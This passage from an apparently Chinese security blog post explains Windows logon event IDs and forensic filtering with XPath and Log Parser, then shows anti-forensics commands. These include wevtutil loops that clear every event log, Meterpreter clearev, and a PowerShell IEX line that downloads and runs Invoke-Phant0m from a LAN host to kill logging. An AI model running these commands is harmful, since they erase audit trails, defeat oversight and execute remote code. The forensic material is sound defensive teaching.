+<li><strong>取证意义：</strong> 这是排查勒索软件入侵、黑客通过跳板机控制内网的核心日志。重点关注 Type 10 登录的源 IP 是否为合法的办公网段或 VPN IP。</li>
+</ul>
+<h3 id="3-访问网络共享目录-执行-PsExec（内网横向移动）"><a href="#3-访问网络共享目录-执行-PsExec（内网横向移动）" class="headerlink" title="3. 访问网络共享目录 / 执行 PsExec（内网横向移动）"></a>3. 访问网络共享目录 / 执行 PsExec（内网横向移动）</h3><p>用户在文件资源管理器地址栏输入 <code>\\192.168.1.100\C$</code>，或者黑客使用 PsExec、WMI 等工具尝试在目标机器上远程执行命令。</p>
+<ul>
+<li><strong>用户动作：</strong> 通过网络验证凭据以访问资源，但并没有在目标机器上调出图形化桌面。</li>
+<li><strong>产生的核心日志：</strong><ul>
+<li><strong>Event ID 4624 (登录成功)</strong>，且 <strong>Logon Type 为 3 (网络)</strong>。</li>
+<li><strong>Event ID 5140 (访问了网络共享对象)</strong>：通常伴随 Type 3 出现，详细记录了用户具体访问了哪个共享文件夹（如 <code>\*\IPC$</code> 或 <code>\*\C$</code>）。</li>
+</ul>
+</li>
+<li><strong>取证意义：</strong> 这是内网渗透测试和 APT 攻击中最常见的日志。当你看到大量的 Logon Type 3，尤其是目标指向 <code>IPC$</code> 或 <code>ADMIN$</code> 时，通常意味着有人在尝试使用 SMB 协议进行横向移动或文件传输。</li>
+</ul>
+<h3 id="4-锁屏与解锁（短暂离开座位）"><a href="#4-锁屏与解锁（短暂离开座位）" class="headerlink" title="4. 锁屏与解锁（短暂离开座位）"></a>4. 锁屏与解锁（短暂离开座位）</h3><p>用户按下 <code>Win + L</code> 离开座位，之后回来重新输入密码。</p>
+<ul>
+<li><strong>用户动作：</strong> 锁定屏幕，然后解锁。</li>
+<li><strong>产生的核心日志：</strong><ul>
+<li><strong>锁定：</strong> 产生 <strong>Event ID 4800 (工作站已被锁定)</strong>。</li>
+<li><strong>解锁：</strong> 产生 <strong>Event ID 4801 (工作站已被解锁)</strong>，同时伴随一个 <strong>Event ID 4624</strong>，且 <strong>Logon Type 为 7 (解锁)</strong>。</li>
+</ul>
+</li>
+<li><strong>取证意义：</strong> 用于精细化追踪用户的时间线。例如，在分析内部数据泄露时，如果恶意操作发生在电脑被锁定期间（ID 4800 之后，ID 4801 之前），那么很可能是后台恶意软件或计划任务所为，而不是用户本人操作。</li>
+</ul>
+<h3 id="5-以其他用户身份运行-UAC-提权（RunAs-凭据窃取）"><a href="#5-以其他用户身份运行-UAC-提权（RunAs-凭据窃取）" class="headerlink" title="5. 以其他用户身份运行 / UAC 提权（RunAs / 凭据窃取）"></a>5. 以其他用户身份运行 / UAC 提权（RunAs / 凭据窃取）</h3><p>用户右键点击程序选择“以管理员身份运行”，或者在命令行中使用 <code>runas /user:administrator cmd.exe</code>，或者黑客使用工具进行哈希传递（Pass-the-Hash）。</p>
+<ul>
+<li><strong>用户动作：</strong> 在当前登录会话中，显式提供另一套凭据来执行程序。</li>
+<li><strong>产生的核心日志：</strong><ul>
+<li><strong>Event ID 4648 (试图使用显式凭据登录)</strong>：这是一个非常关键的前置日志，记录了“是谁”试图用“谁的凭据”执行什么进程。</li>
+<li><strong>Event ID 4624 (登录成功)</strong>，且 <strong>Logon Type 为 9 (新凭据) 或 2 (交互式)</strong>（取决于具体的 RunAs 实现方式）。</li>
+</ul>
+</li>
+<li><strong>取证意义：</strong> 当你追踪提权操作、凭据转储（如运行 Mimikatz）或哈希传递攻击时，ID 4648 和 Logon Type 9 是极其重要的指示器。</li>
+</ul>
+<h3 id="6-系统服务与计划任务自动启动（持久化后门）"><a href="#6-系统服务与计划任务自动启动（持久化后门）" class="headerlink" title="6. 系统服务与计划任务自动启动（持久化后门）"></a>6. 系统服务与计划任务自动启动（持久化后门）</h3><p>系统开机自动启动 MySQL 服务，或者黑客设置了一个定时回连的计划任务。</p>
+<ul>
+<li><strong>用户动作：</strong> 无需人工干预，系统后台自动以特定账户（如 SYSTEM、NetworkService 或指定账户）启动进程。</li>
+<li><strong>产生的核心日志：</strong><ul>
+<li><strong>Event ID 4624 (登录成功)</strong>。</li>
+<li>如果是由服务控制管理器 (SCM) 启动，<strong>Logon Type 为 5 (服务)</strong>。</li>
+<li>如果是通过计划任务 (Task Scheduler) 启动，<strong>Logon Type 为 4 (批处理)</strong>。</li>
+</ul>
+</li>
+<li><strong>取证意义：</strong> 寻找系统中的持久化后门。正常的服务器会有固定的 Type 4 和 Type 5 登录（如定时备份任务）。如果在某个时间点突然新增了未知账户的 Type 4 登录，需立刻排查计划任务列表，这往往是攻击者留下的后门触发点。</li>
+</ul>
+<h2 id="过滤信息"><a href="#过滤信息" class="headerlink" title="过滤信息"></a>过滤信息</h2><h3 id="一、-如何在-Windows-中使用-XML-筛选器"><a href="#一、-如何在-Windows-中使用-XML-筛选器" class="headerlink" title="一、 如何在 Windows 中使用 XML 筛选器"></a>一、 如何在 Windows 中使用 XML 筛选器</h3><p><strong>方式 1：通过图形界面 (Event Viewer)</strong></p>
+<ol>
+<li>打开事件查看器 (<code>eventvwr.msc</code>) -&gt; Windows 日志 -&gt; 安全。</li>
+<li>点击右侧的“<strong>筛选当前日志…</strong>”。</li>
+<li>切换到“<strong>XML</strong>”选项卡，勾选底部的“<strong>手动编辑查询</strong>”</li>
+<li>在文本框中粘贴你的 XML 代码。</li>
+</ol>
+<p><strong>方式 2：通过 PowerShell (推荐取证实战使用)</strong></p>
+<p>图形界面处理海量日志会卡顿，使用 PowerShell 配合 XPath 查询速度更快：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WinEvent -LogName Security -FilterXPath &quot;*[System[(EventID=4624)] and EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;]]&quot;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="二、-核心-XML-语法解析"><a href="#二、-核心-XML-语法解析" class="headerlink" title="二、 核心 XML 语法解析"></a>二、 核心 XML 语法解析</h3><p>Windows 事件日志的底层是一个 XML 文件，主要由两部分组成：</p>
+<ul>
+<li><code>&lt;System&gt;</code> 节点：包含 EventID、时间、提供者等通用信息。</li>
+<li><code>&lt;EventData&gt;</code> 节点：包含事件的详细内容（也就是我们在日志详情里看到的各种参数，如 LogonType、TargetUserName）。</li>
+</ul>
+<p>要精准提取，我们就需要利用 XPath 语法去匹配 <code>&lt;EventData&gt;</code> 里的 <code>&lt;Data&gt;</code> 标签。</p>
+<hr>
+<h3 id="三、-实战高频-XML-筛选模板"><a href="#三、-实战高频-XML-筛选模板" class="headerlink" title="三、 实战高频 XML 筛选模板"></a>三、 实战高频 XML 筛选模板</h3><p>你可以直接复制以下 XML 代码到事件查看器的 XML 选项卡中使用。</p>
+<h4 id="1-筛选特定类型的登录（例如：仅查看-RDP-远程登录）"><a href="#1-筛选特定类型的登录（例如：仅查看-RDP-远程登录）" class="headerlink" title="1. 筛选特定类型的登录（例如：仅查看 RDP 远程登录）"></a>1. 筛选特定类型的登录（例如：仅查看 RDP 远程登录）</h4><p>这是最常用的场景。仅靠基本筛选 4624 会出现大量本地服务登录干扰视线，我们需要精准定位 <code>LogonType=10</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt;</span><br><span class="line">    &lt;Select Path=&quot;Security&quot;&gt;</span><br><span class="line">      *[System[(EventID=4624)]]</span><br><span class="line">      and</span><br><span class="line">      *[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;]]</span><br><span class="line">    &lt;/Select&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2-筛选特定用户的登录失败记录（追踪针对性爆破）"><a href="#2-筛选特定用户的登录失败记录（追踪针对性爆破）" class="headerlink" title="2. 筛选特定用户的登录失败记录（追踪针对性爆破）"></a>2. 筛选特定用户的登录失败记录（追踪针对性爆破）</h4><p>假设你想查看针对管理员账户 (<code>Administrator</code>) 的密码猜测和爆破行为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt;</span><br><span class="line">    &lt;Select Path=&quot;Security&quot;&gt;</span><br><span class="line">      *[System[(EventID=4625)]]</span><br><span class="line">      and</span><br><span class="line">      *[EventData[Data[@Name=&#x27;TargetUserName&#x27;]=&#x27;Administrator&#x27;]]</span><br><span class="line">    &lt;/Select&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="3-筛选内网横向移动（指定-IP-的网络登录）"><a href="#3-筛选内网横向移动（指定-IP-的网络登录）" class="headerlink" title="3. 筛选内网横向移动（指定 IP 的网络登录）"></a>3. 筛选内网横向移动（指定 IP 的网络登录）</h4><p>假设在应急响应中，你发现 <code>192.168.1.50</code> 是一台被攻陷的机器，你想看看这台机器有没有通过 SMB 或 WMI 向当前服务器发起过网络登录（Logon Type 3）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt;</span><br><span class="line">    &lt;Select Path=&quot;Security&quot;&gt;</span><br><span class="line">      *[System[(EventID=4624)]]</span><br><span class="line">      and</span><br><span class="line">      *[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;3&#x27;]]</span><br><span class="line">      and</span><br><span class="line">      *[EventData[Data[@Name=&#x27;IpAddress&#x27;]=&#x27;192.168.1.50&#x27;]]</span><br><span class="line">    &lt;/Select&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="4-筛选“哈希传递攻击”特征-Pass-the-Hash"><a href="#4-筛选“哈希传递攻击”特征-Pass-the-Hash" class="headerlink" title="4. 筛选“哈希传递攻击”特征 (Pass-the-Hash)"></a>4. 筛选“哈希传递攻击”特征 (Pass-the-Hash)</h4><p>在前面的介绍中提到，PtH 攻击通常表现为 4624 登录，Logon Type 为 9，且身份验证包为 <code>Negotiate</code>，登录进程为 <code>seclogo</code>。我们可以用 XML 将这些条件组合起来，直接抓出攻击痕迹：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt;</span><br><span class="line">    &lt;Select Path=&quot;Security&quot;&gt;</span><br><span class="line">      *[System[(EventID=4624)]]</span><br><span class="line">      and</span><br><span class="line">      *[EventData[</span><br><span class="line">        Data[@Name=&#x27;LogonType&#x27;]=&#x27;9&#x27; and </span><br><span class="line">        Data[@Name=&#x27;AuthenticationPackageName&#x27;]=&#x27;Negotiate&#x27; and </span><br><span class="line">        Data[@Name=&#x27;LogonProcessName&#x27;]=&#x27;seclogo&#x27;</span><br><span class="line">      ]]</span><br><span class="line">    &lt;/Select&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="四、-如何自己构造想要过滤的-XML-参数？"><a href="#四、-如何自己构造想要过滤的-XML-参数？" class="headerlink" title="四、 如何自己构造想要过滤的 XML 参数？"></a>四、 如何自己构造想要过滤的 XML 参数？</h3><p>如果你想过滤其他字段（比如工作站名称、登录 GUID 等），但不知道对应的 <code>Data Name</code> 是什么，可以这样做：</p>
+<ol>
+<li>在事件查看器中随便双击打开一个 4624 或 4625 事件日志。</li>
+<li>切换到“<strong>详细信息 (Details)</strong>”选项卡。</li>
+<li>选择“<strong>XML 视图 (XML View)</strong>”。</li>
+<li>在下面的代码中找到 <code>&lt;EventData&gt;</code> 节点。你会看到类似 <code>&lt;Data Name=&#39;TargetUserName&#39;&gt;SYSTEM&lt;/Data&gt;</code> 的格式。</li>
+<li>这个 <code>Name</code> 属性的值（如 <code>TargetUserName</code>、<code>IpAddress</code>、<code>WorkstationName</code>），就是你在编写 XML 筛选规则时 <code>Data[@Name=&#39;这里的值&#39;]</code> 所需要填入的内容。<h2 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h2><h3 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a><code>Log Parser</code></h3>是微软出品的日志分析工具，功能强大，使用简单，可以分析基于文本的日志文件、XML文件、CSV文件，以及操作系统的事件信息、注册表、文件系统、Active Directory。它可以像使用SQL语句一样查询分析数据并以各种图标形式展现出来</li>
+</ol>
+<p>Log Parser 的强大之处在于它将各种系统数据源抽象成了关系型数据库，让你能用标准的 SQL 语句进行查询。在数字取证和应急响应中，熟练掌握它的命令行参数可以极大地提升排查效率。</p>
+<p>以下是 Log Parser 核心命令参数的详细说明和高频使用技巧：</p>
+<h4 id="一、-核心命令语法结构"><a href="#一、-核心命令语法结构" class="headerlink" title="一、 核心命令语法结构"></a>一、 核心命令语法结构</h4><p>Log Parser 的基本运行语法如下：</p>
+<p>Bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:&lt;输入格式&gt; -o:&lt;输出格式&gt; &quot;SQL查询语句&quot; [其他全局参数]</span><br></pre></td></tr></table></figure>
+<hr>
+<h4 id="二、-常用的输入模块-i"><a href="#二、-常用的输入模块-i" class="headerlink" title="二、 常用的输入模块 (-i)"></a>二、 常用的输入模块 (<code>-i</code>)</h4><p>你需要告诉 Log Parser你要分析的数据源是什么类型。</p>
+<ul>
+<li><strong><code>-i:EVT</code></strong>：Windows 事件日志（支持实时的系统日志，也支持脱机的 <code>.evt</code> 和 <code>.evtx</code> 文件）。</li>
+<li><strong><code>-i:IISW3C</code> 或 <code>-i:IIS</code></strong>：IIS Web 服务器日志（在排查 Web 入侵、SQL 注入等 Web 攻击时非常常用）。</li>
+<li><strong><code>-i:CSV</code></strong>：逗号分隔的文本文件。</li>
+<li><strong><code>-i:FS</code></strong>：文件系统（可以把磁盘目录当成数据库查询，用于找寻恶意文件、最近修改的文件）。</li>
+<li><strong><code>-i:REG</code></strong>：注册表（用于排查注册表启动项、持久化后门）。</li>
+<li><strong><code>-i:TEXTLINE</code></strong>：将任意文本文件的每一行作为一个记录读取（适合解析非标准格式的自定义日志）。</li>
+</ul>
+<hr>
+<h4 id="三、-常用的输出模块-o"><a href="#三、-常用的输出模块-o" class="headerlink" title="三、 常用的输出模块 (-o)"></a>三、 常用的输出模块 (<code>-o</code>)</h4><ul>
+<li><strong><code>-o:NAT</code></strong>：（默认）原生格式，直接在命令行窗口输出对齐的文本。</li>
+<li><strong><code>-o:DATAGRID</code></strong>：弹出一个图形化的表格窗口展示数据，支持点击表头排序，非常适合人工审阅。</li>
+<li><strong><code>-o:CSV</code></strong>：输出为 CSV 文件，方便后续导入 Excel 或使用 Python 进行二次分析。</li>
+<li><strong><code>-o:TPL</code></strong>：基于自定义模板输出（常用于生成自动化的 HTML 报告）。</li>
+<li><strong><code>-o:CHART</code></strong>：直接生成图表（如饼图、柱状图，需安装 Office Web Components）。</li>
+</ul>
+<hr>
+<h4 id="四、-关键的全局参数与控制选项"><a href="#四、-关键的全局参数与控制选项" class="headerlink" title="四、 关键的全局参数与控制选项"></a>四、 关键的全局参数与控制选项</h4><p>在日常取证脚本中，经常会搭配这些参数来控制输出格式：</p>
+<ul>
+<li><strong><code>-q:ON</code> 或 <code>-q:OFF</code></strong>：安静模式（Quiet）。开启后（ON）会隐藏执行过程中的统计信息和处理进度，只输出纯净的数据，<strong>在编写批处理或自动化脚本时必加</strong>。</li>
+<li><strong><code>-stats:OFF</code></strong>：仅隐藏底部的统计信息（执行了多少条、耗时多少）。</li>
+<li><strong><code>-recurse:n</code></strong>：指定遍历子目录的层级。分析包含多个子目录的 Web 日志时常用（<code>-recurse:-1</code> 表示无限层级遍历）。</li>
+<li><strong><code>-iCheckpoint:&lt;文件名&gt;</code></strong>：增量分析。记录上次解析到的位置，下次运行只解析新增的日志（适合做日志监控）。</li>
+</ul>
+<hr>
+<h4 id="五、-实战取证查询示例"><a href="#五、-实战取证查询示例" class="headerlink" title="五、 实战取证查询示例"></a>五、 实战取证查询示例</h4><p>结合数字取证场景，这里提供几个可以直接抄作业的命令组合：</p>
+<h5 id="查询脱机日志文件-Offline-EVTX-中的登录失败记录"><a href="#查询脱机日志文件-Offline-EVTX-中的登录失败记录" class="headerlink" title="查询脱机日志文件 (Offline EVTX) 中的登录失败记录"></a>查询脱机日志文件 (Offline EVTX) 中的登录失败记录</h5><p>在取证时，你通常拿到的是导出的 <code>.evtx</code> 文件，而不是查询本机。可以通过 <code>FROM</code> 关键字指定文件路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated, EventID, ComputerName, Strings FROM &#x27;C:\Forensics\Security.evtx&#x27; WHERE EventID = 4625&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="统计-IIS-日志中访问量最高的前-10-个-IP（排查-Web-扫描或-CC-攻击）"><a href="#统计-IIS-日志中访问量最高的前-10-个-IP（排查-Web-扫描或-CC-攻击）" class="headerlink" title="统计 IIS 日志中访问量最高的前 10 个 IP（排查 Web 扫描或 CC 攻击）"></a>统计 IIS 日志中访问量最高的前 10 个 IP（排查 Web 扫描或 CC 攻击）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:IISW3C &quot;SELECT TOP 10 c-ip AS SourceIP, COUNT(*) AS Hits FROM &#x27;C:\inetpub\logs\LogFiles\W3SVC1\*.log&#x27; GROUP BY c-ip ORDER BY Hits DESC&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="利用文件系统模块寻找-C-盘最近-24-小时内被修改过的-exe-或-dll-文件（寻找落地的恶意程序）"><a href="#利用文件系统模块寻找-C-盘最近-24-小时内被修改过的-exe-或-dll-文件（寻找落地的恶意程序）" class="headerlink" title="利用文件系统模块寻找 C 盘最近 24 小时内被修改过的 .exe 或 .dll 文件（寻找落地的恶意程序）"></a>利用文件系统模块寻找 C 盘最近 24 小时内被修改过的 <code>.exe</code> 或 <code>.dll</code> 文件（寻找落地的恶意程序）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:FS &quot;SELECT Path, LastWriteTime, Size FROM &#x27;C:\*&#x27; WHERE Name LIKE &#x27;%.exe&#x27; OR Name LIKE &#x27;%.dll&#x27; AND LastWriteTime &gt; SUB(SYSTEM_TIMESTAMP(), TIMESTAMP(&#x27;0000-01-01 00:00:00&#x27;, &#x27;yyyy-MM-dd HH:mm:ss&#x27;))&quot; -recurse:-1</span><br></pre></td></tr></table></figure>
+<h5 id="查询登录成功的事件"><a href="#查询登录成功的事件" class="headerlink" title="查询登录成功的事件"></a>查询登录成功的事件</h5><p>登录成功的事件 ID 是 4624。为了让输出结果更清晰，我们通常提取生成时间、事件 ID、计算机名以及包含详细信息的字符串。</p>
+<p>基础查询命令（输出到命令行窗口）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated, EventID, ComputerName, Strings FROM Security WHERE EventID = 4624&quot;</span><br></pre></td></tr></table></figure>
+<p>进阶查询（以图形化表格 DataGrid 格式展示，适合人工分析）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated, EventID, ComputerName, Strings FROM Security WHERE EventID = 4624&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="查询登录失败的事件"><a href="#查询登录失败的事件" class="headerlink" title="查询登录失败的事件"></a>查询登录失败的事件</h5><p>登录失败的事件 ID 是 4625。这在排查暴力破解或异常登录尝试时非常有用。</p>
+<p>基础查询命令（输出到命令行窗口）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT &quot;SELECT TimeGenerated, EventID, ComputerName, Strings FROM Security WHERE EventID = 4625&quot;</span><br></pre></td></tr></table></figure>
+<p>进阶查询（统计失败登录次数最多的前 10 个时间点或记录，并输出为 CSV 方便进一步处理）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:CSV &quot;SELECT TOP 10 TimeGenerated, EventID, ComputerName, Strings FROM Security WHERE EventID = 4625 ORDER BY TimeGenerated DESC&quot; &gt; FailedLogons.csv</span><br></pre></td></tr></table></figure>
+<h5 id="统计系统日志中各-Event-ID-的出现频率"><a href="#统计系统日志中各-Event-ID-的出现频率" class="headerlink" title="统计系统日志中各 Event ID 的出现频率"></a>统计系统日志中各 Event ID 的出现频率</h5><p>快速了解系统日志的全貌，找出异常飙升的事件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:NAT &quot;SELECT EventID, COUNT(*) AS TotalEvents FROM Security GROUP BY EventID ORDER BY TotalEvents DESC&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a><code>Event Log Explorer</code></h3><p><strong>Event Log Explorer</strong> 是一款用于查看、监控和分析 Windows 系统事件日志的专业工具，支持安全、系统、应用程序等多类日志，适用于安全审计、故障排查及取证分析。</p>
+<h1 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a>Windows日志清除</h1><h2 id="wevtutil日志清理"><a href="#wevtutil日志清理" class="headerlink" title="wevtutil日志清理"></a><code>wevtutil</code>日志清理</h2><p><code>wevtutil.exe</code>：用于检索有关事件日志和发布者的信息、安装和卸载事件清单，运行查询以及导出、存档和清除日志</p>
+<h3 id="核心参数解析"><a href="#核心参数解析" class="headerlink" title="核心参数解析"></a>核心参数解析</h3><p>在深入命令之前，先明确截图中那些缩写参数的具体含义，这有助于你自己构造命令：</p>
+<ul>
+<li><strong><code>qe</code> (Query Events)</strong>：查询事件。</li>
+<li><strong><code>epl</code> (Export Log)</strong>：导出日志。</li>
+<li><strong><code>cl</code> (Clear Log)</strong>：清除日志。</li>
+<li><strong><code>el</code> (Enum Logs)</strong>：枚举系统中所有的日志名称（通道）。</li>
+<li><strong><code>/f:text</code> 或 <code>/f:xml</code></strong>：指定输出格式 (Format)。XML 视图会包含非常重要的 <code>EventRecordID</code></li>
+<li><strong><code>/rd:true</code></strong>：反向读取 (Reverse Direction)，即从最新（最近）的日志开始读取。</li>
+<li><strong><code>/c:N</code></strong>：限制返回的日志数量 (Count)。</li>
+</ul>
+<hr>
+<h3 id="日志清理命令完善"><a href="#日志清理命令完善" class="headerlink" title="日志清理命令完善"></a>日志清理命令完善</h3><p>截图里展示了清理 <code>Security</code>、<code>System</code>、<code>Application</code> 和 <code>Windows PowerShell</code> 的单条命令。在实战中，攻击者往往会做得更彻底。</p>
+<p><strong>1. 基础单项清理（通常需要管理员权限）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl Security</span><br><span class="line">wevtutil cl System</span><br><span class="line">wevtutil cl Application</span><br><span class="line">wevtutil cl Setup</span><br></pre></td></tr></table></figure>
+<p><strong>2. 进阶实战：一键清除所有 Windows 事件日志 (自动化清理)</strong> Windows 系统中不仅有这几个主日志，还有几百个应用程序和服务日志（如 RDP 连接日志、WMI 监控日志等）。如果想要彻底“毁尸灭迹”，可以通过组合命令遍历清理。</p>
+<ul>
+<li><strong>CMD 批处理方式：</strong> 利用 <code>wevtutil el</code> 列出所有日志名称，并通过 <code>for</code> 循环逐一清除。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F &quot;tokens=*&quot; %1 in (&#x27;wevtutil.exe el&#x27;) DO wevtutil.exe cl &quot;%1&quot;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>PowerShell 方式：</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el | Foreach-Object &#123;wevtutil cl &quot;$_&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Meterpreter清理日志"><a href="#Meterpreter清理日志" class="headerlink" title="Meterpreter清理日志"></a><code>Meterpreter</code>清理日志</h2><ul>
+<li>删除所有在渗透中使用的工具</li>
+<li>删除之前添加的账号</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username /del</span><br></pre></td></tr></table></figure>
+<hr>
+<ul>
+<li>删除应用程序、系统和安全模块日志<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<ul>
+<li>关闭所有<code>Meterpreter</code>连接<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br><span class="line">sessions -k</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<ul>
+<li>查看事件日志<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -i</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<ul>
+<li>删除事件日志</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -c</span><br></pre></td></tr></table></figure>
+<h2 id="停止日志记录"><a href="#停止日志记录" class="headerlink" title="停止日志记录"></a>停止日志记录</h2><p>利用脚本让日志功能失效，无法记录日志<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell “IEX(new-object system.net.webclient).downloadstring(‘[http://192.168.231.147/Invoke-Phant0m.ps1](https://link.zhihu.com/?target=http%3A//192.168.231.147%3A8000/Invoke-Phant0m.ps1)’);Invoke-Phant0m”</span><br></pre></td></tr></table></figure></p>
+<p>把<code>evventlog</code>对应的<code>svchost</code>进程结束</p>
+<p>重新开启<code>Windows Event Log</code>服务，即可恢复日志记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start evenntLog</span><br></pre></td></tr></table></figure>
+<h2 id="EventLogMaster"><a href="#EventLogMaster" class="headerlink" title="EventLogMaster"></a>EventLogMaster</h2></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.xchstudy.org">chen7chen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a 